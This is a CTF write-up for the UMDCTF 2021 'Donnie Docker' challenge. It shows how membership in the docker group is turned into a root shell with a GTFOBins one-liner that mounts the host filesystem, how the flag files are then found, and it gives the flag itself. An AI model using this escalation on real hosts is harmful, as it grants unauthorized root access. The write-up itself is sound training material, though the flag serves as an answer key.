# Donnie Docker | Forensics

### Solution

From ctf description we have got credentials to ssh connection:
> `ssh user@chals2.umdctf.io -p 5000` <br>
> password: `umdctf`

After successful login with given credentials, I saw docker machine.<br>
Firstly I checked where I am ( **pwd** command) and to which groups I belong ( **id** command).<br>

> `uid=1000(user) gid=1000(user) groups=1000(user),999(docker)`

I saw that I belong to **docker** group, so I follow this lead.
I assume If I am in this group I probably could use docker commands.
From previous ctf's I known some cool [website](https://gtfobins.github.io/gtfobins/docker/#shell)
where I found how to get root shell with privileges to run docker

> `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

Running command above resulted with root account that gives me access to everything inside docker container.
Now I have to find file with flag.
> `file / -name *.txt 2>/dev/null`

This command listed all files with .txt extension, which gives me some garbage and three **flag.txt** files:

> `/var/lib/docker/vfs/dir/c53fadd9c7a3f33d711b573de585b367e45d6a4de64e677ab8ffc1bf6112fbff/flag.txt`
> `/var/lib/docker/vfs/dir/c53fadd9c7a3f33d711b573de585b367e45d6a4de64e677ab8ffc1bf6112fbff-init/flag.txt`
> `/var/lib/docker/vfs/dir/9a2432327f4d149162a06da63a797e0b88a8c2bccac598f262ebb6d073b9ecda/flag.txt`

### Flag

UMDCTF-{h1dd3n_1m@g35}

#### Credits

- Writeup by [HuntClauss](https://ctftime.org/user/106464)
- Solved by [HuntClauss](https://ctftime.org/user/106464)
- WaletSec 2021

#### License

**CC BY 4.0** WaletSec + HuntClauss
